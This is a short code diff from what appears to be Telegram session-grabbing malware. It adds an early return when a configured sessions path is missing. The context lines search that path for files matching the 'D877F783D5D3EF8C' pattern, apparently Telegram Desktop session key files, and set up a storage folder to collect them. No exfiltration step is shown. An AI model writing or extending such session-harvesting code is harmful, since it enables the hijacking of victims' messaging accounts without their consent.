@@ -25,6 +25,9 @@ class Telegram:
 
         folder = rf"{self.storage_path}\{self.folder}"
 
+        if not path.exists(self.config.SessionsPath):
+            return
+
         sessions = sum([findall(r"D877F783D5D3EF8C.*", file) for file in listdir(self.config.SessionsPath)], [])
 
         if len(sessions) < 1:
